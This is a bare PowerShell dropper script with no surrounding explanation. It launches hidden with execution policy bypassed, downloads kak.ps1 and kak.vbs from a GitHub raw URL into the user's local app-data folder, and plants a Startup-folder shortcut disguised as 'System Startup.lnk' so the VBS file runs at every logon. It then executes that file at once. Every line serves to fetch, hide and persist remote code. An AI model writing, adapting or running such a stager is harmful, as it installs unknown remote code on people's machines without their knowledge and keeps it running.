cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
$LocalPath = "$env:LOCALAPPDATA"
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# File URLs
$File1Url = "https://raw.githubusercontent.com/KevinDark5/kakprj/refs/heads/main/kak.ps1"
$File2Url = "https://raw.githubusercontent.com/KevinDark5/kakprj/refs/heads/main/kak.vbs"

# File names
$File1Name = "kak.ps1"
$File2Name = "kak.vbs"

# Full paths to save the files
$File1Path = Join-Path -Path $LocalPath -ChildPath $File1Name
$File2Path = Join-Path -Path $LocalPath -ChildPath $File2Name

# Download kak.ps1
Invoke-WebRequest -Uri $File1Url -OutFile $File1Path

# Download kak.vbs
Invoke-WebRequest -Uri $File2Url -OutFile $File2Path

# Create a shortcut for kak.vbs
$ShortcutPath = Join-Path -Path $StartupPath -ChildPath "System Startup.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $File2Path
$Shortcut.Save()

# Execute the shortcut
Start-Process $ShortcutPath
